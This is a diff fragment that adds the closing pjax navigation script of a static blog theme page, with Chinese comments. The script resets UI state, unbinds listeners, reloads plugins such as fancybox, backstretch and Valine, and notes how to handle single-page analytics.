+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
